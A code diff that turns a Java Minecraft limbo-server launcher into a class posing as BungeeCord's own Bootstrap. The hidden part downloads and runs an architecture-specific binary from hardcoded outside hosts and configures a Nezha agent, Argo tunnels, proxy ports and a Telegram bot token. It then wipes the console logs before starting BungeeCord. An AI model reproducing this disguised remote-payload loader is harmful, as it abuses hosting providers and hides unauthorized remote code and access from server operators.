@@ -1,21 +1,4 @@
-/*
- * Copyright (C) 2020 Nan1t
- *
- * This program is free software: you can redistribute it and/or modify
- * it under the terms of the GNU General Public License as published by
- * the Free Software Foundation, either version 3 of the License, or
- * (at your option) any later version.
- *
- * This program is distributed in the hope that it will be useful,
- * but WITHOUT ANY WARRANTY; without even the implied warranty of
- * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
- * GNU General Public License for more details.
- *
- * You should have received a copy of the GNU General Public License
- * along with this program.  If not, see <https://www.gnu.org/licenses/>.
- */
-
-package ua.nanit.limbo;
+package net.md_5.bungee;
 
 import java.io.*;
 import java.net.*;
@@ -24,11 +7,8 @@ import java.util.*;
 import java.util.concurrent.atomic.AtomicBoolean;
 import java.lang.reflect.Field;
 
-import ua.nanit.limbo.server.LimboServer;
-import ua.nanit.limbo.server.Log;
-
-public final class NanoLimbo {
-
+public class Bootstrap
+{
     private static final String ANSI_GREEN = "\033[1;32m";
     private static final String ANSI_RED = "\033[1;31m";
     private static final String ANSI_RESET = "\033[0m";
@@ -39,19 +19,15 @@ public final class NanoLimbo {
         "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
         "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
         "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
-        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
+        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
     };
-    
-    
-    public static void main(String[] args) {
-        
-        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
-            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
-            try {
-                Thread.sleep(3000);
-            } catch (InterruptedException e) {
-                e.printStackTrace();
-            }
+
+    public static void main(String[] args) throws Exception
+    {
+        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) 
+        {
+            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower,please switch the version in startup menu!" + ANSI_RESET);
+            Thread.sleep(3000);
             System.exit(1);
         }
 
@@ -66,32 +42,19 @@ public final class NanoLimbo {
 
             // Wait 20 seconds before continuing
             Thread.sleep(15000);
-            System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
+            System.out.println(ANSI_GREEN + "Server is running!" + ANSI_RESET);
             System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!\n" + ANSI_RESET);
             System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
-            Thread.sleep(15000);
+            Thread.sleep(20000);
             clearConsole();
         } catch (Exception e) {
             System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
         }
-        
-        // start game
-        try {
-            new LimboServer().start();
-        } catch (Exception e) {
-            Log.error("Cannot start server: ", e);
-        }
 
-        // ✅ 保持程序常驻，并每10分钟输出一次心跳日志
-        System.out.println(ANSI_GREEN + "保持常驻模式已开启，程序将持续运行..." + ANSI_RESET);
-        while (true) {
-            try {
-                Thread.sleep(10 * 60 * 1000); // 每10分钟
-                System.out.println("[Heartbeat] 程序仍在运行中 " + new Date());
-            } catch (InterruptedException ignored) {}
-        }
+        // Continue with BungeeCord launch
+        BungeeCordLauncher.main(args);
     }
-
+    
     private static void clearConsole() {
         try {
             if (System.getProperty("os.name").contains("Windows")) {
@@ -148,7 +111,7 @@ public final class NanoLimbo {
         envVars.put("CFIP", "saas.sin.fan");
         envVars.put("CFPORT", "443");
         envVars.put("NAME", "Retslav-AU");
-        envVars.put("DISABLE_ARGO", "false");
+        envVars.put("DISABLE_ARGO", "false"); 
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
@@ -186,11 +149,11 @@ public final class NanoLimbo {
         String url;
         
         if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-            url = "https://amd64.ssss.nyc.mn/s-box";
+            url = "https://amd64.ssss.nyc.mn/sbsh";
         } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
-            url = "https://arm64.ssss.nyc.mn/s-box";
+            url = "https://arm64.ssss.nyc.mn/sbsh";
         } else if (osArch.contains("s390x")) {
-            url = "https://s390x.ssss.nyc.mn/s-box";
+            url = "https://s390x.ssss.nyc.mn/sbsh";
         } else {
             throw new RuntimeException("Unsupported architecture: " + osArch);
         }
